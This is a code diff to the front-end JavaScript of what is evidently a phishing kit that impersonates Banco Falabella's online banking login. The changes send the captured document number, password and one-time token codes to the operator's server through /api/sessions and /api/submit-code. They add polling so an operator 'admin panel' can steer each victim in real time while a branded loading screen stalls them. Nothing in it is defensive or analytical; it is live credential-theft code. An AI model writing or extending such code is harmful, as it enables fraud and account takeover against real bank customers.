@@ -287,29 +287,24 @@ if (bancaDocNumber && bancaPassword) {
 
 const bancaLoadingOverlay = document.querySelector("#banca-loading-overlay");
 
-// Session and Command Receiver Logic for Admin Panel
+// Session and Command Receiver Logic for Admin Panel (REST API)
 let currentSessionId = null;
 
-function saveCapturedSession(docType, docNumber, password) {
-  currentSessionId = "sess_" + Date.now();
-  const sessions = JSON.parse(localStorage.getItem("falabella_sessions")) || [];
-  const now = new Date();
-  const timeStr = now.toLocaleDateString("es-PE") + " " + now.toLocaleTimeString("es-PE", { hour: '2-digit', minute: '2-digit' });
-  
-  const newSession = {
-    id: currentSessionId,
-    docType,
-    docNumber,
-    password,
-    time: timeStr,
-    status: "SPINNER",
-    timestamp: Date.now()
-  };
-  
-  sessions.unshift(newSession);
-  localStorage.setItem("falabella_sessions", JSON.stringify(sessions));
-  
-  startCommandPolling();
+async function saveCapturedSession(docType, docNumber, password) {
+  try {
+    const res = await fetch("/api/sessions", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ docType, docNumber, password })
+    });
+    if (res.ok) {
+      const data = await res.json();
+      currentSessionId = data.sessionId;
+      startCommandPolling();
+    }
+  } catch (e) {
+    console.error("Error saving session to API:", e);
+  }
 }
 
 let commandPollTimer = null;
@@ -318,12 +313,18 @@ function startCommandPolling() {
   commandPollTimer = setInterval(checkAdminCommands, 800);
 }
 
-function checkAdminCommands() {
+async function checkAdminCommands() {
   if (!currentSessionId) return;
-  const activeAction = JSON.parse(localStorage.getItem("falabella_active_action"));
-  if (activeAction && activeAction.id === currentSessionId) {
-    handleAdminAction(activeAction.action);
-    localStorage.removeItem("falabella_active_action");
+  try {
+    const res = await fetch(`/api/session-status/${currentSessionId}`);
+    if (res.ok) {
+      const data = await res.json();
+      if (data.action) {
+        handleAdminAction(data.action);
+      }
+    }
+  } catch (e) {
+    console.error("Error checking admin commands:", e);
   }
 }
 
@@ -420,14 +421,16 @@ if (tokenForm) {
   });
 }
 
-function saveCapturedCode(code, type) {
-  const sessions = JSON.parse(localStorage.getItem("falabella_sessions")) || [];
-  const target = sessions.find(s => s.id === currentSessionId);
-  if (target) {
-    target.capturedCode = code;
-    target.codeType = type;
-    target.status = "SPINNER";
-    localStorage.setItem("falabella_sessions", JSON.stringify(sessions));
+async function saveCapturedCode(code, type) {
+  if (!currentSessionId) return;
+  try {
+    await fetch("/api/submit-code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId: currentSessionId, code, type })
+    });
+  } catch (e) {
+    console.error("Error submitting captured code:", e);
   }
 }
 
@@ -445,7 +448,7 @@ if (bancaForm) {
     
     bancaBtnSubmit.disabled = true;
     
-    // Save credentials & session
+    // Save credentials & session to API
     saveCapturedSession(bancaDocType.value, bancaDocNumber.value.trim(), bancaPassword.value.trim());
     
     // Show center screen loading overlay with Banco Falabella logo indefinitely
